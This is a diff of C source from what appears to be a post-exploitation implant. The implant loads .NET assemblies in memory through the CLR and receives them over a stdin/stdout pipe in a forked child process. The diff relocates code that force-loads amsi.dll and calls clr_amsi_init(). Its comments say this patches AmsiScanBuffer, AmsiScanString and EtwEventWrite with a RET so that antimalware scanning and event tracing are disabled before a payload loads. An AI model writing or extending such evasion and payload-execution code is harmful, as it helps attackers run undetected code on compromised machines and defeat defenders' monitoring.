@@ -373,24 +373,16 @@ char* dotnet_exec(const uint8_t *asm_bytes, size_t asm_len, const char *args, in
     if (!asm_bytes || asm_len < 2) return _strdup("dotnet_exec: empty payload");
     if (!load_oleaut32()) return _strdup("dotnet_exec: oleaut32.dll load failed");
 
-    // Pre-load and patch AMSI before any CLR code runs.
-    // The CLR loads amsi.dll lazily during Assembly.Load() — patching after
-    // Start() is too late because ev_get_module() returns NULL when amsi.dll
-    // isn't in the PEB yet.  LoadLibraryA forces amsi.dll into the PEB first,
-    // then clr_amsi_init() patches AmsiScanBuffer/AmsiScanString/EtwEventWrite.
-    // When the CLR later calls AmsiInitialize it finds the DLL already present
-    // and reuses the same mapping — our RET patch stays in place.
-    if (child_mode) {
-        LoadLibraryA("amsi.dll");
-        clr_amsi_init();
-    }
-
-    // Capture pipe handle BEFORE CLR init — ICorRuntimeHost::Start() may reset
-    // standard handles internally (same as observed in the Go agent).
+    // In child_mode: capture the pipe handle that fork_run_assembly set as our stdout.
+    // Needed after ICorRuntimeHost::Start() which may reset standard handles.
     HANDLE hPipe = INVALID_HANDLE_VALUE;
     if (child_mode) {
         hPipe = GetStdHandle(STD_OUTPUT_HANDLE);
         if (hPipe == NULL) hPipe = INVALID_HANDLE_VALUE;
+        // Force-load amsi.dll before CLR init so clr_amsi_init can find and patch it.
+        // CLR loads amsi.dll lazily during Load_3; we must patch before that call.
+        LoadLibraryA("amsi.dll");
+        clr_amsi_init();
     }
 
     // Load CLRCreateInstance
@@ -470,6 +462,7 @@ char* dotnet_exec(const uint8_t *asm_bytes, size_t asm_len, const char *args, in
     // ── AppDomain.Load_3(saAsm) → _Assembly ─────────────────────────────────
     typedef HRESULT (WINAPI *pfnLoad3)(void*, SAFEARRAY*, void**);
     void *pAssembly = NULL;
+
     // Try vtbl[44] first (CLR 4.x), fall back to vtbl[45]
     hr = ((pfnLoad3*)VTBL(pAppDomain))[44](pAppDomain, saAsm, &pAssembly);
     if (FAILED(hr) || !pAssembly) {
@@ -739,12 +732,10 @@ char* fork_run_assembly(const uint8_t *asm_bytes, size_t asm_len, const char *ar
 // ── Child entry: read protocol from stdin, run CLR via pipe, exit ─────────────
 
 void clr_child_run(void) {
-    // No VEH installed here. In .NET 4+ on x64, AVs from managed code (NullRef,
-    // etc.) go through SEH frames that the CLR's JIT sets up; a tail-of-chain
-    // VEH fires before those SEH frames and would wrongly terminate the process
-    // on any managed exception. Genuine native crashes are reported by the
-    // parent via the non-zero exit code path in fork_run_assembly.
-
+    // No VEH installed. In .NET 4+ on x64, AVs from managed code (NullRef, etc.)
+    // go through SEH frames the CLR's JIT sets up; a tail-of-chain VEH fires before
+    // those and would wrongly terminate on any managed exception. Native crashes are
+    // reported by the parent via the non-zero exit code in fork_run_assembly.
     HANDLE hIn = GetStdHandle(STD_INPUT_HANDLE);
     BYTE   hdr[4];
     DWORD  rd, off;
